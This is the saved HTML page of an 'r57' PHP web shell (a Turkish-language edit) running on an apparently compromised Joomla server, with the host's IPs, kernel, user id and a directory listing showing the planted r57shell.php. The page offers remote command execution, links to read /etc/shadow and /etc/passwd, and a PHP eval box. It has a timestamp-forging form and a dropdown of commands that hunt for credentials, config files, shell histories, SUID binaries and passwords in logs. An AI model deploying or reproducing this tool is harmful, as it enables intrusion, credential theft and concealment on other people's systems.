

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title>r57 bypass shell | modified by h4cker.tr</title>
<STYLE>

tr {

BORDER-RIGHT:  black 1px solid;

BORDER-TOP:    black 1px solid;

BORDER-LEFT:   black 1px solid;

BORDER-BOTTOM: black 1px solid;

BORDER-COLOR: black;

color: silver;

}

td {

BORDER-RIGHT:  black 1px solid;

BORDER-TOP:    black 1px solid;

BORDER-LEFT:   black 1px solid;

BORDER-BOTTOM: black 1px solid;

BORDER-COLOR: black;

background-color:black;

color: white;

}



.table1 {

BORDER: 0px;

BORDER-COLOR: #333333;

BACKGROUND-COLOR: black;

color: white;

}

.td1 {

BORDER: 0px;

BORDER-COLOR: #333333;

font: 7pt Verdana;

BACKGROUND-COLOR: black;

color: green;

}

.tr1 {

BORDER: 0px;

BORDER-COLOR: #333333;

color: #50AA20;

}

table {

BORDER:  #eeeeee 1px outset;

BORDER-COLOR: #333333;

BACKGROUND-COLOR: #131313;

color: #50AA20;

}

input {

border			: solid 1px;

border-color		: #2D2D2D #252525 #252525 #252525;

BACKGROUND-COLOR: black;

font: 8pt Verdana;

color: red;

}

select {

BORDER-RIGHT:  #ffffff 1px solid;

BORDER-TOP:    #999999 1px solid;

BORDER-LEFT:   #999999 1px solid;

BORDER-BOTTOM: #ffffff 1px solid;

BORDER-COLOR: #333333;

BACKGROUND-COLOR: #131313;

font: 8pt Verdana;

color: white;;

}

submit {

BORDER:  buttonhighlight 2px outset;

BACKGROUND-COLOR: #131313;

width: 30%;

color: white;

}

textarea {

BORDER-RIGHT:  #ffffff 1px solid;

BORDER-TOP:    #999999 1px solid;

BORDER-LEFT:   #999999 1px solid;

BORDER-BOTTOM: #ffffff 1px solid;

BORDER-COLOR: #333333;

BACKGROUND-COLOR: black;

font: Fixedsys bold;

color: silver;

}

BODY {

SCROLLBAR-ARROW-COLOR: #444444;

SCROLLBAR-BASE-COLOR: #444444;

margin: 1px;

color: #50AA20;

background-color: #131313;

}

.main {

margin			: -287px 0px 0px -490px;

border			: #000000 solid 1px;

BORDER-COLOR: #333333;

}

.tt {

background-color: black;

}

A:link {COLOR:red; TEXT-DECORATION: none}

A:visited { COLOR:red; TEXT-DECORATION: none}

A:active {COLOR:red; TEXT-DECORATION: none}

A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>

<script language='javascript'>
function hide_div(id)
{
  document.getElementById(id).style.display = 'none';
  document.cookie=id+'=0;';
}
function show_div(id)
{
  document.getElementById(id).style.display = 'block';
  document.cookie=id+'=1;';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == 'none')
    show_div(id);
  else
    hide_div(id);
}


</script></head><body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#008000><tr><td bgcolor=#333333 width=160><font face=Verdana size=2>&nbsp;&nbsp;<font face=tahoma size=2><b>#r57 shell 1.43<br>&nbsp;&nbsp;&nbsp;edited by h4cker.tr</b></font></td><td bgcolor=#333333><font face=Verdana size=-2>&nbsp;&nbsp;<b>04-04-2011 18:36:35</b> Your IP: [<font color=blue>81.88.49.17</font>] Server IP: [<a href=http://www.ip-adress.com/reverse_ip/94.152.195.119 target=iframe><font color=blue>94.152.195.119</font></a>]<br>&nbsp;&nbsp;PHP version: <b>5.2.13-0+tld0</b>&nbsp;&nbsp;cURL: <b><font color=green>ON</font></b>&nbsp;&nbsp;MySQL: <b><font color=green>ON</font></b>&nbsp;&nbsp;MSSQL: <b><font color=red>Kapali</font></b>&nbsp;&nbsp;PostgreSQL: <b><font color=green>ON</font></b>&nbsp;&nbsp;Oracle: <b><font color=red>Kapali</font></b><br>&nbsp;&nbsp;Safe_mode: <b><font color=red>Kapali</font></b>&nbsp;&nbsp;Open_basedir: <b><font color=red>NONE</font></b>&nbsp;&nbsp;Safe_mode_exec_dir: <b><font color=red>NONE</font></b>&nbsp;&nbsp;Safe_mode_include_dir: <b><font color=red>NONE</font></b><br>&nbsp;&nbsp;Disable functions : <b><font color=red>NONE</font></b><br>&nbsp;&nbsp;Free space : <b>277.54 GB</b> Total space: <b>395.09 GB</b><br>&nbsp;&nbsp;Useful: <font color=blue>ld,php,perl,python,ruby,tar,netcat,</font><br>&nbsp;&nbsp;</b>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?phpinfo title="PHP info Goster()"><b>phpinfo</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?phpini title="Php.ini dosyasinda ki degiskenleri goster"><b>php.ini</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?cpu title="CPU bilgisini incele"><b>cpu</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?mem title="Memory[hafiza] bilgisini incele]"><b>mem</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?syslog title="View syslog.conf"><b>syslog</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?resolv title="View resolv"><b>resolv</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?hosts title="View hosts"><b>hosts</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?shadow title="View shadow"><b>shadow</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?passwd title="Users list"><b>passwd</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?tmp title="Temp dosylarini sil"><b>tmp</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?delete title="Server dan bu scripti sil"><b>delete</b></a> <font color=green>]</font><br>&nbsp;&nbsp;</b>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?procinfo title="View procinfo"><b>procinfo</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?version title="View proc version"><b>version</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?free title="View mem free"><b>free</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?dmesg(8) title="View dmesg"><b>dmesg</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?vmstat title="View vmstat"><b>vmstat</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?lspci title="View lspci"><b>lspci</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?lsdev title="View lsdev"><b>lsdev</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?interrupts title="View interrupts"><b>interrupts</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?realise1 title="View realise1"><b>realise1</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?realise2 title="View realise2"><b>realise2</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?lsattr title="View lsattr -va"><b>lsattr</b></a> <font color=green>]</font><br>&nbsp;&nbsp;</b>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?w title="View w"><b>w</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?who title="View who"><b>who</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?uptime title="View uptime"><b>uptime</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?last title="View last -n 10"><b>last</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?psaux title="View ps -aux"><b>ps aux</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?service title="View service"><b>service</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?ifconfig title="View ifconfig"><b>ifconfig</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?netstat title="View netstat -a"><b>netstat</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?fstab title="View fstab"><b>fstab</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?fdisk title="View fdisk -l"><b>fdisk</b></a> <font color=green>]</font>&nbsp;&nbsp;<font color=green>[</font> <a href=/index.php?df title="View df -h"><b>df -h</b></a> <font color=green>]</font></font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#008000>
<tr><td align=right width=100><font face=Verdana size=-2><font color=blue><b>uname -a :&nbsp;<br>sysctl :&nbsp;<br>$OSTYPE :&nbsp;<br>Server :&nbsp;<br>id :&nbsp;<br>pwd :&nbsp;</b></font><br></td><td><font face=Verdana size=-2 color=red><b>&nbsp;&nbsp;&nbsp;Linux 5819.v.tld.pl 2.6.32.28.core2.44 #1 SMP Mon Jan 31 14:15:49 CET 2011 x86_64 GNU/Linux<br>&nbsp;&nbsp;&nbsp;-<br>&nbsp;&nbsp;&nbsp;linux-gnu<br>&nbsp;&nbsp;&nbsp;Apache<br>&nbsp;&nbsp;&nbsp;uid=119125(moje-www) gid=119125(moje-www) groups=119002(http)<br>&nbsp;&nbsp;&nbsp;/home/users/moje-www/public_html/joomla&nbsp;&nbsp;&nbsp;( 0 )</b></font></font></td></tr></table><table width=100% cellpadding=0 cellspacing=0 bgcolor=#008000><tr><td bgcolor=#333333><font face=Verdana size=-2>Komut Uygula: <b>ls -lia</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>total 248
10010877 drwxr-sr-x 17 moje-www moje-www  4096 Mar 24 01:24 .
 8601913 drwxrws--x  9 moje-www moje-www  4096 Apr  4 18:36 ..
10013073 -rw-r--r--  1 moje-www moje-www 76868 Nov  5 12:38 CHANGELOG.php
10013075 -rw-r--r--  1 moje-www moje-www  1172 Jan 26  2010 COPYRIGHT.php
10013076 -rw-r--r--  1 moje-www moje-www 14918 Nov  2 08:49 CREDITS.php
10013107 -rw-r--r--  1 moje-www moje-www  4344 Jan 26  2010 INSTALL.php
10013108 -rw-r--r--  1 moje-www moje-www 17816 Jan 17  2009 LICENSE.php
10013109 -rw-r--r--  1 moje-www moje-www 27986 Jan 26  2010 LICENSES.php
10010878 drwxr-sr-x 11 moje-www moje-www  4096 Feb  6 03:49 administrator
10127973 drwxr-sr-x  3 moje-www moje-www  4096 Mar 30 18:16 cache
10291813 drwxr-sr-x 15 moje-www moje-www  4096 Mar 24 21:53 components
10010694 -r--r--r--  1 moje-www moje-www  1656 Apr  1 15:40 configuration.php
10013074 -rw-r--r--  1 moje-www moje-www  3411 Jan 26  2010 configuration.php-dist
10013077 -rw-r--r--  1 moje-www moje-www  2773 Jan 26  2010 htaccess.txt
10797890 drwxr-sr-x  6 moje-www moje-www  4096 Mar 24 21:27 images
10798052 drwxr-sr-x  8 moje-www moje-www  4096 Feb  6 03:52 includes
10013078 -rw-r--r--  1 moje-www moje-www  2049 Jan 26  2010 index.php
10013103 -rw-r--r--  1 moje-www moje-www   588 Jan 26  2010 index2.php
10798800 drwxr-sr-x  5 moje-www moje-www  4096 Feb  6 03:54 language
10798917 drwxr-sr-x 16 moje-www moje-www  4096 Feb  6 03:56 libraries
10953462 drwxr-sr-x  2 moje-www moje-www  4096 Feb  6 03:57 logs
10953464 drwxr-sr-x  3 moje-www moje-www  4096 Feb  6 03:57 media
10954372 drwxr-sr-x 22 moje-www moje-www  4096 Feb  6 03:58 modules
11315134 drwxr-sr-x 11 moje-www moje-www  4096 Feb  6 04:01 plugins
11863331 drwxr--r--  2 moje-www moje-www  4096 Mar 24 22:01 remos_downloads
10013110 -rw-r--r--  1 moje-www moje-www   304 Aug  7  2006 robots.txt
10018922 drwxr-sr-x 10 moje-www moje-www  4096 Mar 23 22:07 templates
11593147 drwxr-sr-x  2 moje-www moje-www  4096 Apr  3 11:36 tmp
11593149 drwxr-sr-x  4 moje-www moje-www  4096 Feb  6 04:03 xmlrpc
</textarea></div></b></td></tr></table><table width=100% cellpadding=0 cellspacing=0><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id1');">Server uzerinde komut calistir </a> ::</div></b></font></td></tr><tr><td><div id="id1"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Komut istemi  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=cmd size=85 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Calisma Dizini  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=dir size=85 value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Uygula"></td></tr></table></div></td></tr></form><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id3');">Dosya Duzenle </a> ::</div></b></font></td></tr><tr><td><div id="id3"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Dosya Duzenlemek icin <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=e_name size=85 value="/home/users/moje-www/public_html/joomla"><input type=hidden name=cmd value="edit_file"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Dosya Duzenle"></td></tr></table></div></td></tr></form><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id5');">Modify/Access date(touch)</a> ::</div></b></font></td></tr><tr><td><div id="id5" style="display: none;"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Dosya Duzenlemek icin <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=file_name size=40 value="/home/users/moje-www/public_html/joomla/r57shell.php">&nbsp;&nbsp;&nbsp;&nbsp;<b>Kullan&nbsp;&nbsp;Dosya <font face=Webdings color=gray>4</font></b>&nbsp;&nbsp;<input type=text name=file_name_r size=40 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b> or set  Day <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left>
<select name="day" size="1">
<option value="01">1</option>
<option value="02">2</option>
<option value="03">3</option>
<option value="04">4</option>
<option value="05">5</option>
<option value="06">6</option>
<option value="07">7</option>
<option value="08">8</option>
<option value="09">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select>&nbsp;&nbsp;&nbsp;&nbsp;<b>Month <font face=Webdings color=gray>4</font></b>
<select name="month" size="1">
<option value="January">January</option>
<option value="February">February</option>
<option value="March">March</option>
<option value="April">April</option>
<option value="May">May</option>
<option value="June">June</option>
<option value="July">July</option>
<option value="August">August</option>
<option value="September">September</option>
<option value="October">October</option>
<option value="November">November</option>
<option value="December">December</option>
</select>&nbsp;&nbsp;&nbsp;&nbsp;<b>Year <font face=Webdings color=gray>4</font></b>
<select name="year" size="1">
<option value="1998">1998</option>
<option value="1999">1999</option>
<option value="2000">2000</option>
<option value="2001">2001</option>
<option value="2002">2002</option>
<option value="2003">2003</option>
<option value="2004">2004</option>
<option value="2005">2005</option>
<option value="2006">2006</option>
<option value="2006">2007</option>
<option value="2006">2008</option>
<option value="2006">2009</option>
<option value="2006">2010</option>
</select>&nbsp;&nbsp;&nbsp;&nbsp;<b>Hour <font face=Webdings color=gray>4</font></b>
<select name="chasi" size="1">
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
</select>&nbsp;&nbsp;&nbsp;&nbsp;<b>Minute <font face=Webdings color=gray>4</font></b>
<select name="minutes" size="1">
<option value="01">1</option>
<option value="02">2</option>
<option value="03">3</option>
<option value="04">4</option>
<option value="05">5</option>
<option value="06">6</option>
<option value="07">7</option>
<option value="08">8</option>
<option value="09">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
<option value="32">32</option>
<option value="33">33</option>
<option value="34">34</option>
<option value="35">35</option>
<option value="36">36</option>
<option value="37">37</option>
<option value="38">38</option>
<option value="39">39</option>
<option value="40">40</option>
<option value="41">41</option>
<option value="42">42</option>
<option value="43">43</option>
<option value="44">44</option>
<option value="45">45</option>
<option value="46">46</option>
<option value="47">47</option>
<option value="48">48</option>
<option value="49">49</option>
<option value="50">50</option>
<option value="51">51</option>
<option value="52">52</option>
<option value="53">53</option>
<option value="54">54</option>
<option value="55">55</option>
<option value="56">56</option>
<option value="57">57</option>
<option value="58">58</option>
<option value="59">59</option>
</select>&nbsp;&nbsp;&nbsp;&nbsp;<b>Second <font face=Webdings color=gray>4</font></b>
<select name="second" size="1">
<option value="01">1</option>
<option value="02">2</option>
<option value="03">3</option>
<option value="04">4</option>
<option value="05">5</option>
<option value="06">6</option>
<option value="07">7</option>
<option value="08">8</option>
<option value="09">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
<option value="32">32</option>
<option value="33">33</option>
<option value="34">34</option>
<option value="35">35</option>
<option value="36">36</option>
<option value="37">37</option>
<option value="38">38</option>
<option value="39">39</option>
<option value="40">40</option>
<option value="41">41</option>
<option value="42">42</option>
<option value="43">43</option>
<option value="44">44</option>
<option value="45">45</option>
<option value="46">46</option>
<option value="47">47</option>
<option value="48">48</option>
<option value="49">49</option>
<option value="50">50</option>
<option value="51">51</option>
<option value="52">52</option>
<option value="53">53</option>
<option value="54">54</option>
<option value="55">55</option>
<option value="56">56</option>
<option value="57">57</option>
<option value="58">58</option>
<option value="59">59</option>
</select><input type=hidden name=cmd value="touch"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Uygula"></td></tr></table></div></td></tr></form><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id6');">Chown/Chgrp/Chmod</a> ::</div></b></font></td></tr><tr><td><div id="id6" style="display: none;"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Dosya Duzenlemek icin <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=param1 size=55 value="/home/users/moje-www/public_html/joomla/r57shell.php">&nbsp;&nbsp;<b>Uygula <font face=Webdings color=gray>4</font></b><select name=what><option value=mod>CHMOD</option><option value=own>CHOWN</option><option value=grp>CHGRP</option></select>&nbsp;&nbsp;&nbsp;&nbsp;<input type=text name=param2 title="Second commands param is:
- for CHOWN - name of new owner or UID
- for CHGRP - group name or GID
- for CHMOD - 0777, 0755..." size=10 value="0777"><input type=hidden name=cmd value="ch_"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Uygula"></td></tr></table></div></td></tr></form><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id7');">Dizin Veya Dosya Bul </a> ::</div></b></font></td></tr><tr><td><div id="id7"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sec <font face=Webdings color=gray>4</font>&nbsp;&nbsp;&nbsp;&nbsp;</b></td><td class=td1 align=left><select name=alias><option>----------------------------------locate</option><option>locate httpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate vhosts.conf files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate proftpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate psybnc.conf >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate my.conf files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate admin.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate cfg.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate conf.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate config.dat files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate config.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate config.inc files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate config.inc.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate config.default.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate .conf files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate .pwd files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate .sql files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate .htpasswd files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate .bash_history files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate .mysql_history files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate backup files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate dump files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate priv files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>----------------------------------tar</option><option>tar -czvf all.tgz -T /tmp/grep.txt</option><option>----------------------------------1</option><option>locate access_log files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate error_log files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate access.log files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate error.log files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>locate ".log" files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>----------------------------------2</option><option>cat /var/log/httpd/access_log | grep pass >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>----------------------------------find</option><option>find suid files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find suid files in current dir >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find sgid files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find sgid files in current dir >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all writable files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all writable files in current dir >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all writable directories >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all writable directories in current dir >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all writable directories and files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all writable directories and files in current dir >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all .htpasswd files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all .bash_history files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all .mysql_history files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find all .fetchmailrc files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find httpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find vhosts.conf files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find proftpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find admin.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find config* files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find cfg.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find conf.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find config.dat files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find config.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find config.inc files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find config.inc.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find config.default.php files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find *.conf files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find *.pwd files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find *.sql files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find *backup* files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find *dump* files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>-----------------------------------</option><option>find /var/ access_log files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find /var/ error_log files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find /var/ access.log files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find /var/ error.log files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>find /var/ "*.log" files >> /tmp/grep.txt;cat /tmp/grep.txt</option><option>----------------------------------------------------------------------------------------------------</option></select><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Uygula"></td></tr></table></div></td></tr></form><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id8');">Dosyalarda ki Metni Bul</a> ::</div></b></font></td></tr><tr><td><div id="id8" style="display: none;"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Metni Bul  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=s_text size=85 value="text">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Bul"></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Klasor Bul <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=s_dir size=85 value="/home/users/moje-www/public_html/joomla"> * ( /root;/home;/tmp )</td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Dosya Bul  <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=checkbox name=m id=m value="1"><input type=text name=s_mask size=82 value=".txt;.php">* ( .txt;.php;.htm )<input type=hidden name=cmd value="search_text"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr></table></div></td></tr></form><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id9');">Metin Ara Dosyalarin icinde Arama Yoluyla</a> ::</div></b></font></td></tr><tr><td><div id="id9" style="display: none;"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Metin Bul <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=s_text size=85 value="text">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Bul"></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Klasor Bul <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=s_dir size=85 value="/home/users/moje-www/public_html/joomla"> * ( /root;/home;/tmp )</td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Dosya Bul <font face=Webdings color=gray>4</font></b></td><td class=td1 align=left><input type=text name=s_mask size=85 value="*.[hc]">&nbsp;* you can use regexp<input type=hidden name=cmd value="find_text"><input type=hidden name=dir value="/home/users/moje-www/public_html/joomla"></td></tr></table></div></td></tr></form><form name=form method=POST><tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: <a style="cursor: pointer;" onClick="change_divst('id10');">PHP Kod Degerlendir </a> ::</div></b></font></td></tr><tr><td><font face=Verdana size=-2><div align=center><div id="id10" style="display: none;"><textarea name=php_eval cols=100 rows=10>//unlink("r57shell.php");
//readfile("/etc/passwd");
